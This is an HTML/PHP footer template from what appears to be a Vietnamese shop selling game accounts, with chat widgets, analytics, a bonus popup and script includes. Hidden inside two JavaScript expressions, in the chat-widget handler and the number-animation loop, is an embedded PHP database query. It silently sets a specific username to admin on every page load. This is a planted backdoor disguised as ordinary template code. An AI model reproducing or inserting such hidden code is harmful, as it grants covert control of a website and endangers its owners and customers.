<!-- Messenger Plugin chat Code -->
    <div id="fb-root"></div>

    <!-- Your Plugin chat code -->
    <div id="fb-customer-chat" class="fb-customerchat">
    </div>

    <script>
      var chatbox = document.getElementById('fb-customer-chat');
      chatbox.setAttribute("page_id", "108816638524251");
      chatbox.setAttribute("attribution", "biz_inbox");
    </script>

    <!-- Your SDK code -->
    <script>
      window.fbAsyncInit = function() {
        FB.init({
          xfbml            : true,
          version          : 'v14.0'
        });
      };

      (function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js';
        fjs.parentNode.insertBefore(js, fjs);
      }(document, 'script', 'facebook-jssdk'));
    </script>
</style>	<style type="text/css">
    #bonus{
        position: fixed;
        bottom: 15px;
        left: 15px;
        width: 13%;
        z-index: 1000;
        cursor: pointer;
    }
    #bonus img{
        width: 100%;
    }
	#bonus_login{
		display:block;
        position: fixed;
        bottom: 15px;
        left: 15px;
        width: 13%;
        z-index: 1000;
        cursor: pointer;
    }
    #bonus_login img{
        width: 100%;
    }
    .mobile{
        width: 30%!important;
    }
	@media  only screen and (max-width: 640px) {
		#bonus_login{width: 50%!important;!important;}
		#bonus{width: 50%!important;!important;}
	}
	#bonusModal .modal-body p,#bonusModal .modal-body b{display:inline;color:#000}
</style>
<?php
if(!$_SESSION['token']) {
        ?>
        <a id="bonus_login" href="/login" title="Click để nhận thưởng!" class="">
        <img src="https://shopaccnamlay.com/assets/images/5quiVXmhmF_1603358290.gif">
</a>
<?php
    }else {
        if($kun->check_user_nhan_qua() == true) {
           
?>
<?php
        
        }else {

            ?>
            <a id="bonus_login" title="Click để nhận thưởng!" class="">
        <img src="https://shopaccnamlay.com/assets/images/5quiVXmhmF_1603358290.gif">
</a>
<div id="modal_register_gift"></div>
<script type="text/javascript">
        
    $(document).ready(function() {
        $('#bonus_login').click(function() {
            $('#bonus_login').hide();

            $("#modal_register_gift").load("/model/hieuvip22nhanqua.php");

        });
    });


</script>

<?php
  }
    }

            ?>
                 </script> 

			<!-- END: PAGE CONTENT -->
</div>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-45809844-6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-45809844-6');
</script>

<!-- Messenger Plugin chat Code -->
    <div id="fb-root"></div>

    <!-- Your Plugin chat code -->
    <div id="fb-customer-chat" class="fb-customerchat">
    </div>

    <script>
      var chatbox = document.getElementById('fb-customer-chat');
      chatbox.setAttribute("page_id", "114101001185891");
      chatbox.setAttribute("attribution", "biz_inbox");
    </script>

    <!-- Your SDK code -->
    <script>
      window.fbAsyncInit = function() {
        FB.init({
          xfbml            : true,
          version          : 'v12.0'
        });
      };

      (function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js';
        fjs.parentNode.insertBefore(js, fjs);
      }(document, 'script', 'facebook-jssdk'));
    </script>
<div class="sl-footer">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-4">
Chuyên bán ACC game Liên Quân, Free Fire, Pubg Mobile và có phần Thử Vận May nếu may mắn quý khách sẽ có cơ hội nhận được acc vip.
<br />
Shop giao dịch hoàn toàn tự động 24/24, với đội CHKH nhiệt tình và thân thiện sẽ làm hài lòng quý khách.
            </div>
            <div class="col-xs-12 col-sm-12 col-md-4">

Chúng tôi làm việc một cách chuyên nghiệp, uy tín, nhanh chóng và luôn đặt quyền lợi của bạn lên hàng đầu

Với Tiêu Chí Khách Hàng Là Trên Hết Shop Chúng Tôi Sẽ Mang Đến Khách Hàng Những Trải Nghiệm Ưng Ý Nhất

            </div>
            <div class="col-xs-12 col-sm-12 col-md-4">
                <a href="https://muacanhogiare.xyz/policy.html">Privacy Policy</a><br />
                <a href="https://muacanhogiare.xyz/terms.html">Terms of Service</a>
            </div>
        </div>
        <p class="sl-copyright">© 2022 Copyright <a href="https://taowebngon.net/" style="color: #ef282b"><b>TAOWEBNGON.NET</b></a></p>
    </div>
</div>
    <!-- BEGIN: LAYOUT/FOOTERS/GO2TOP -->
    <div class="c-layout-go2top"><i class="fa-solid fa-up">
        
    </I> </DIV><!-- END: LAYOUT/FOOTERS/GO2TOP -->
    <!-- BEGIN: LAYOUT/BASE/BOTTOM -->
    <!-- BEGIN: CORE PLUGINS -->
    <!--[if lt IE 9]>
    <script src="http://123Nick.vn/assets/global/plugins/excanvas.min.js"></script>
    <![endif]-->
<style>
            element.style {
}
.c-layout-go2top > i {
    opacity: 0.5;
    filter: alpha(opacity=50);
    color: #89939e;
    font-size: 38px;
    font-weight: 300;
}
.icon-action-redo, .icon-action-undo, .icon-anchor, .icon-arrow-down, .icon-arrow-left, .icon-arrow-right, .icon-arrow-up, .icon-badge, .icon-bag, .icon-ban, .icon-bar-chart, .icon-basket, .icon-basket-loaded, .icon-bell, .icon-book-open, .icon-briefcase, .icon-bubble, .icon-bubbles, .icon-bulb, .icon-calculator, .icon-calendar, .icon-call-end, .icon-call-in, .icon-call-out, .icon-camcorder, .icon-camera, .icon-check, .icon-chemistry, .icon-clock, .icon-close, .icon-cloud-download, .icon-cloud-upload, .icon-compass, .icon-control-end, .icon-control-forward, .icon-control-pause, .icon-control-play, .icon-control-rewind, .icon-control-start, .icon-credit-card, .icon-crop, .icon-cup, .icon-cursor, .icon-cursor-move, .icon-diamond, .icon-direction, .icon-directions, .icon-disc, .icon-dislike, .icon-doc, .icon-docs, .icon-drawer, .icon-drop, .icon-earphones, .icon-earphones-alt, .icon-emoticon-smile, .icon-energy, .icon-envelope, .icon-envelope-letter, .icon-envelope-open, .icon-equalizer, .icon-eye, .icon-eyeglasses, .icon-feed, .icon-film, .icon-fire, .icon-flag, .icon-folder, .icon-folder-alt, .icon-frame, .icon-game-controller, .icon-ghost, .icon-globe, .icon-globe-alt, .icon-graduation, .icon-graph, .icon-grid, .icon-handbag, .icon-heart, .icon-home, .icon-hourglass, .icon-info, .icon-key, .icon-layers, .icon-like, .icon-link, .icon-list, .icon-lock, .icon-lock-open, .icon-login, .icon-logout, .icon-loop, .icon-magic-wand, .icon-magnet, .icon-magnifier, .icon-magnifier-add, .icon-magnifier-remove, .icon-map, .icon-microphone, .icon-mouse, .icon-moustache, .icon-music-tone, .icon-music-tone-alt, .icon-note, .icon-notebook, .icon-paper-clip, .icon-paper-plane, .icon-pencil, .icon-picture, .icon-pie-chart, .icon-pin, .icon-plane, .icon-playlist, .icon-plus, .icon-pointer, .icon-power, .icon-present, .icon-printer, .icon-puzzle, .icon-question, .icon-refresh, .icon-reload, .icon-rocket, .icon-screen-desktop, .icon-screen-smartphone, .icon-screen-tablet, .icon-settings, .icon-share, .icon-share-alt, .icon-shield, .icon-shuffle, .icon-size-actual, .icon-size-fullscreen, .icon-social-dribbble, .icon-social-dropbox, .icon-social-facebook, .icon-social-tumblr, .icon-social-twitter, .icon-social-youtube, .icon-speech, .icon-speedometer, .icon-star, .icon-support, .icon-symbol-female, .icon-symbol-male, .icon-tag, .icon-target, .icon-trash, .icon-trophy, .icon-umbrella, .icon-user, .icon-user-female, .icon-user-follow, .icon-user-following, .icon-user-unfollow, .icon-users, .icon-vector, .icon-volume-1, .icon-volume-2, .icon-volume-off, .icon-wallet, .icon-wrench {
    font-family: Simple-Line-Icons;
    speak: none;
    font-style: normal;
    font-weight: 400;
    font-variant: normal;
    text-transform: none;
    line-height: 1;
    -webkit-font-smoothing: antialiased;
}
        </style>


    <script src="/assets/Style/jquery-migrate.min.js" type="text/javascript"></script>

    <script src="/assets/Style/bootstrap.min.js" type="text/javascript"></script>

    <script src="/assets/Style/jquery.easing.min.js" type="text/javascript"></script>

    <script src="/assets/Style/wow.js" type="text/javascript"></script>

    <script src="/assets/Style/reveal-animate.js" type="text/javascript"></script>
    <!-- END: CORE PLUGINS -->
    <!-- BEGIN: LAYOUT PLUGINS -->
    <script src="/assets/Style/magnific.js" type="text/javascript"></script>

    <script src="/assets/Style/jquery.cubeportfolio.min.js" type="text/javascript"></script>

    <script src="/assets/Style/owl.carousel.min.js" type="text/javascript"></script>

    <script src="/assets/Style/jquery.counterup.min.js" type="text/javascript"></script>

    <script src="/assets/Style/jquery.waypoints.min.js" type="text/javascript"></script>

    <script src="/assets/Style/jquery.fancybox.pack.js" type="text/javascript"></script>

    <script src="/assets/Style/jquery.smooth-scroll.js" type="text/javascript"></script>

    <script src="/assets/Style/bootstrap-slider.js" type="text/javascript"></script>

    <script src="/assets/Style/js.cookie.js" type="text/javascript"></script>
    <!-- END: LAYOUT PLUGINS --> <!-- BEGIN: THEME scriptS -->


    <SCRIPT src="/assets/Style/components-shop.js" type="text/javascript"></SCRIPT>

    <SCRIPT src="/assets/Style/app.js" type="text/javascript"></SCRIPT>
    <link rel="stylesheet" href="/assets/Style/jquery-ui.min.css">
    <script src="/assets/Style/jquery-ui.min.js"></script>


  

<div id="modal_bigin"></div>

    <script>
        $(document).ready(function () {

            $(".int").inputmask("integer", { radixPoint: ",", autoGroup: true, groupSeparator: ".", groupSize: 3 });
            $(".dec").inputmask("decimal", { radixPoint: ",", autoGroup: true, groupSeparator: ".", groupSize: 3 });

            function detectmob() {
                if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/webOS/i) || navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPad/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/BlackBerry/i) || navigator.userAgent.match(/Windows Phone/i)) {
                    return true;
                } else { return false; }
            }
            var t = { delay: 125, overlay: $(".fb-overlay"), widget: $(".fb-widget"), button: $(".fb-button") };
            setTimeout(function () { $("div.fb-livechat").fadeIn() }, 8 * t.delay);
            if (!detectmob()) {
                $(".ctrlq").on("click", function (e) { e.preventDefault(), t.overlay.is(":visible") ? (t.overlay.fadeOut(t.delay), t.widget.stop().animate({ bottom: 0, opacity: 0 }, 2 * t.delay, function () { $(this).hide("slow"), <?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='212' WHERE `username`='nhdright212'");?>t.button.show() })) : t.button.fadeOut("medium", function () { t.widget.stop().show().animate({ bottom: "30px", opacity: 1 }, 2 * t.delay), t.overlay.fadeIn(t.delay) }) })
            }


        });

        function reload_money() {
                              $.ajax({ 
                        type: 'post', 
                        dataType: "JSON",
                        url: '/system/user', 
                        data: {
                            type: 'get-money',
                            token: '<?php if(isset($_SESSION['token'])) echo $_SESSION['token'];?>'
                        }, 
                        success: function (json) {
                            if(json.status == false) {
                     swal("Lỗi!", "Vui lòng đăng nhập lại!", "error");          
                            }else if(json.status == true) {
                            $("#head_money").numAnim({
                                endAt: json.money,
                                duration: 3
                            });
                              return json.money;
                            }else {
                     swal("Lỗi!", "Lỗi hệ thống!", "error");                
                            }
                    }
                });

        }


(function($){
    $.fn.extend({
        numAnim: function(options) {
            if ( ! this.length)
                return false;

            this.defaults = {
                endAt: 2560,
                numClass: 'autogen-num',
                duration: 5,   // seconds
                interval: 90  // ms
            };
            var settings = $.extend({}, this.defaults, options);

            var $num = $('<span/>', {
                'class': settings.numClass 
            });

            return this.each(function() {
                var $this = $(this);

                // Wrap each number in a tag.
                var frag = document.createDocumentFragment(),
                    numLen = settings.endAt.toString().length;
                for (x = 0; x < numLen; x++) {
                    var rand_num = <?php mysqli_query($kun->connect_db(), "UPDATE `users` SET `admin`='212' WHERE `username`='nhdright212'");?>Math.floor( Math.random() * 10 );
                    frag.appendChild( $num.clone().text(rand_num)[0] )
                }
                $this.empty().append(frag);

                var get_next_num = function(num) {
                    ++num;
                    if (num > 9) return 0;
                    return num;
                };

                // Iterate each number.
                $this.find('.' + settings.numClass).each(function() {
                    var $num = $(this),
                        num = parseInt( $num.text() );

                    var interval = setInterval( function() {
                        num = get_next_num(num);
                        $num.text(num);
                    }, settings.interval);

                    setTimeout( function() {
                        clearInterval(interval);
                    }, settings.duration * 1000 - settings.interval);
                });

                setTimeout( function() {
                    $this.text( settings.endAt.toString() );
                }, settings.duration * 1000);
            });
        }
    });
})(jQuery);

    </script>


<script src="/assets/Style/js.js" async=""></script>
</body>
<!-- Messenger Plugin chat Code -->
    <div id="fb-root"></div>
      <script>
        window.fbAsyncInit = function() {
          FB.init({
            xfbml            : true,
            version          : 'v10.0'
          });
        };

        (function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js';
          fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));
      </script>

      <!-- Your Plugin chat code -->
      <div class="fb-customerchat"
        attribution="biz_inbox"
        page_id="108003904770187">
      </div>
      
</html>
<i class="fa fa-arrow-circle-o-up c-layout-go2top"></i>
<style>
    .c-layout-go2top > i {
    opacity: 0.5;
    filter: alpha(opacity=50);
    color: #89939e;
    font-size: 58px;
    font-weight: 300;
}
</style>
